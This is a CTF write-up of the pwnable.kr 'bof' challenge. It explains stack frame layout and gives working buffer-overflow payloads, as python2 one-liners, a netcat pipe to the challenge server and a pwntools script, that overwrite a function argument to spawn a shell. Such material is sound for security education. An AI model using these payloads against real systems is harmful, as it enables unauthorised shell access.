---
layout: article
title:  "bof - pwnable.kr"
date:   2021-09-21 03:30:53 +0  530
tags:
  - writeup
  - pwnable.kr
  - buffer overflow
  - pwntools
---

> Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?
Download : [http://pwnable.kr/bin/bof](http://pwnable.kr/bin/bof)
Download : [http://pwnable.kr/bin/bof.c](http://pwnable.kr/bin/bof.c)
Running at : nc [pwnable.kr](http://pwnable.kr/) 9000


---

# Method 1 : without pwntools

*bof.c*

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

This binary is running on a server, and we need to make `key` equal to `0xcafebabe`

but key already has a given value.

So we need to somehow overwrite its default value

---

### Some info about memory

This is the memory layout 

![Untitled](/assets/images/posts/bof//Untitled.png)

The function calls and local variables are stored in the `stack`

`heap` is from where memory is allocated to dynamic variables.

Every time a function is called, a **stack frame** is created in the stack to store the function.

This is done as follows

- first the arguments are stored in the stack in reversed order
- then the `instruction pointer` eip register is stored which stores the address to return to
- then the `base pointer` ebp register is stored in the stack with value as of esp (esp was updated when arguments and return address were stored, now we can change esp since we have a backup)
- then space(buffer) is allocated for local variables by increasing(decreasing as it moves downwards) the esp.

Some points to remember

- A stack is filled from higher memory to lower memory.
- In a stack, all the variables are accessed relative to the EBP.
- In a program, every function has its own stack.
- Everything is referenced from the EBP register.

![Untitled](/assets/images/posts/bof//Untitled%201.png)

Now when we store value in variable , suppose an array, it will be filled from ESP and go down towards EBP.

### EBP register

So basically ebp will store the esp value and act as a backup to esp as esp will move.

> To all who are still trying to understand, for me the key was to tell this to myself : push ebp to the stack for a ebp backup. Then move esp to ebp. Now we can "play" with esp. Before function returns, move back ebp to esp to restore what esp was before we moved esp to ebp. Then pop ebp to restore ebp from the top of the stack.
> 

[What are the ESP and the EBP registers?](https://stackoverflow.com/a/21718526/12548269)

---

So back to the challenge.

As we know the `key` argument will we stored above EIP and EBP.

We can do this by overflowing the input of gets function, such that the buffer exends to the address where the arguement is stored

We start by loading the program in gdb

`gdb bof`

Now we can disas main

![Untitled](/assets/images/posts/bof//Untitled%202.png)

The pink dot marks the instruction which [loads the address at ebp](https://stackoverflow.com/questions/44684936/how-to-determine-if-the-registers-are-loaded-right-to-left-or-vice-versa) - 0x2c (i.e 0x2c bytes below ebp) into eax. This indicates that gets input will begin to be written at ebp-0x2c and will move towards ebp. 

Since `gets` takes input of any length as long as it doesn't encounters new line, we can enter any lenght of input. 

So what we want is to enter such a input that it overwrites the 0x2c buffer, then overwrites 4 bytes of EBP , then 4 bytes of EIP, with any random values, but after that it should overwrite 0xdeadbeef with 0xcafebabe.

We can use the following python command to generate the reqd input

```bash
python2 -c "print 'a'*0x2c + 'b'*4 + 'c'*4 + '\xbe\xba\xfe\xca'" | ./bof
```

or 

```bash
(echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca'; cat) | ./bof
```

here cat is used to keep the process(ig) open since echo executes and shuts down

in gdb we can use this as follows

```python
run <<< $(python2 -c "print 'a'*0x2c + 'b'*4 + 'c'*4 + '\xbe\xba\xfe\xca'")
```

We can check this works by examining memory and registers after the gets call, once with entering normal input and once our payload

![Untitled](/assets/images/posts/bof//Untitled%203.png)

note : before examining with gdb , once run the program so that memory gets solidified (idk)

![Untitled](/assets/images/posts/bof//Untitled%204.png)

without payload input

![Untitled](/assets/images/posts/bof//Untitled%205.png)

with our payload input

With this command you can exploit the binary

```bash
(python2 -c "print 'a'*0x2c + 'b'*4 + 'c'*4 + '\xbe\xba\xfe\xca'"; cat) | nc pwnable.kr 9000
```

![Untitled](/assets/images/posts/bof//Untitled%206.png)

# Method 2: with pwntools

So we have to do similiar analysis like in method 1, but we can send the payload in a better way using a script with [pwntools](https://www.notion.so/pwntools-0b8a5451f8ab4452900f2931df2b652f) 

```python
from pwn import *

context.log_level = 'debug' # makes it more verbose

target = remote('pwnable.kr',9000)

p = b'a'*0x2c # buffer
p += b'b'*4   # ebp
p += b'c'*4	 # eip
p += p32(0xcafebabe) 

target.sendline(p)

target.interactive()
```

Note : this is written in `python 3` . It has different types of strings, we need to send a byte string so we have suffixed strings with `b` . `p32` returns a byte string already

![Untitled](/assets/images/posts/bof//Untitled%207.png)